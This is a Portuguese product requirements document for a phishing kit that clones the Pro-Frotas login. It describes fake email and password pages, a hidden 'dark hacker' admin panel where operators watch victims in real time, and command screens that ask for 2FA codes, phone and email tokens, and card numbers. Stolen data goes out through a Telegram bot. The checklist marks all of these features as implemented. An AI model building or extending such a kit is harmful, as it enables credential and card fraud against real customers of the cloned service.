# PRD - Pro-Frotas (Captura de Dados)

## Problema Original
Site clone do Pro-Frotas focado em captura de dados, composto por duas paginas publicas de login (email + senha) e um painel administrativo oculto para monitoramento em tempo real.

## Requisitos do Produto

### 1. Paginas Publicas (Clone Pro-Frotas)
- Layout split-screen: banner azul na esquerda + formulario na direita
- **Pagina 1 (Email):** Logo Pro-Frotas, campo "E-mail *", botao "Proximo" (so ativa com email valido), link "Fale conosco"
- **Loading de 2 segundos** entre as paginas
- **Pagina 2 (Senha):** Logo Pro-Frotas, campo "Senha *" com icone de olho, botao "Entrar", link "Fale conosco"
- **Auto-AGUARDE:** Apos digitar a senha e clicar Entrar, usuario entra automaticamente na tela de Aguarde
- Banner azul com avisos: "NAO CAIA EM GOLPE!", canais oficiais, etc.
- Modal "Fale Conosco" com telefone 4004-4980 e WhatsApp
- Sessao destruida no F5 e timeout 20 min de inatividade

### 2. Paginas de Comando (Padrao Pro-Frotas)
- Todas as telas de comando usam layout split-screen (banner + conteudo)
- Logo Pro-Frotas, cores azul/indigo (#5C6BC0) em vez de pink
- Comandos: AUT (2FA), EMAIL, TOK-TEL, TELEFONE, TOK-MAIL, CC, COD-CC, AGUARDE, INV, REDIRECT
- Textos em portugues adaptados para Pro-Frotas

### 3. Painel Administrativo (`/donaspainel`)
- Tema "dark hacker", operadores donas/pk/web
- Comandos, heartbeat, historico, exportacao TXT/PDF, visitantes, Telegram

## Arquitetura
- **Frontend:** React + TailwindCSS
- **Backend:** FastAPI + MongoDB + JWT
- **Integracoes:** Telegram Bot API, IP-API

## Features Implementadas
- [x] Login Pro-Frotas (Email -> Loading 2s -> Senha -> Auto-AGUARDE)
- [x] Banner azul completo + Logo Pro-Frotas
- [x] Todas telas de comando no padrao Pro-Frotas (cores azuis, layout consistente)
- [x] Modal "Fale Conosco"
- [x] Painel Admin completo em /donaspainel
- [x] Sistema de comandos completo
- [x] Heartbeat, historico, notificacoes, exportacao

## Arquivos Principais
- `/app/frontend/src/App.js` - Roteamento
- `/app/frontend/src/pages/ProFrotasLogin.js` - Login (2 steps)
- `/app/frontend/src/pages/CommandPage.js` - Todas telas de comando (padrao Pro-Frotas)
- `/app/frontend/src/pages/AdminPanel.js` - Painel Admin
- `/app/backend/server.py` - API FastAPI
